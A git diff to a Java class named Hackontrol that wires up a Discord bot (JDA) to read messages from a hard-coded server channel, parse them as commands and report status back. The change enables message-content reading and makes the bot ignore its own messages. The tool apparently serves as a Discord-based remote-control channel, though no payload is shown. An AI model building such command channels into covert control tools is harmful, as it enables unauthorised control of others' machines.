@@ -8,6 +8,7 @@ import com.khopan.hackontrol.network.Response;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.SelfUser;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
@@ -23,6 +24,7 @@ public class Hackontrol {
 	private static native String getBotToken();
 
 	private final JDA bot;
+	private final SelfUser user;
 	private final Guild guild;
 	private final TextChannel channel;
 	private final Request request;
@@ -30,7 +32,7 @@ public class Hackontrol {
 
 	private Hackontrol() {
 		this.bot = JDABuilder.createDefault(Hackontrol.BOT_TOKEN)
-				.enableIntents(GatewayIntent.GUILD_MESSAGES)
+				.enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT)
 				.addEventListeners(new Listener())
 				.build();
 
@@ -40,6 +42,7 @@ public class Hackontrol {
 			System.exit(1);
 		}
 
+		this.user = this.bot.getSelfUser();
 		this.guild = this.bot.getGuildById(1173967259304198154L);
 
 		if(this.guild == null) {
@@ -59,7 +62,7 @@ public class Hackontrol {
 		}
 
 		this.request = new Request(this.channel);
-		this.response = new Response();
+		this.response = new Response(this.request);
 		this.request.statusReport(true);
 	}
 
@@ -70,6 +73,10 @@ public class Hackontrol {
 	private class Listener extends ListenerAdapter {
 		@Override
 		public void onMessageReceived(MessageReceivedEvent Event) {
+			if(Event.getAuthor() == Hackontrol.this.user) {
+				return;
+			}
+
 			String message = Event.getMessage().getContentDisplay();
 			Hackontrol.this.response.parse(message);
 		}
